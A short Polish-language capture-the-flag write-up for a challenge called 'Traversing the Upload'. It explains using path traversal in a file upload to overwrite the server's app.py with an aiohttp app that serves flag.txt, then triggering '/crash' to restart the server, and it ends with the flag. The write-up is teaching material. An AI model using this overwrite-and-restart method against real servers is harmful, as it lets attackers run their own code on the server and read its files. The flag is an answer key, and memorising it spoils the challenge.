# Traversing the Upload
![](893c1fcd37049fa0182703b28a108b12)

Jak sam tytuł mówi należy użyć ataku Path Traversal. Ponieważ jedynie można zapisać/nadpisać plik, dlatego trzeba zastąpić plik app.py złośliwym kodem, który wyświetla flagę. Póżniej można wykorzystać funkcje "/crash", która uruchomi nasz złośliwy kod.

Złośliwy kod:
```
from aiohttp import web

routes = web.RouteTableDef()


@routes.get("/")
async def mal(request):
    with open('flag.txt') as file:
        flag = file.read()
        return web.json_response({'flag': flag})

app = web.Application()
app.add_routes(routes)
web.run_app(app)
```
Napisałem kod, który wysyła plik z złośliwym kodem, używa funkcji "/crash" i czyta flagę z uruchomiengo złośliwego kodu.

Kod: `solution/traverse.py`

Flaga: `WSIZ{w0w_y0u_ar3_re4lly_7he_py7h0n_m45ter}`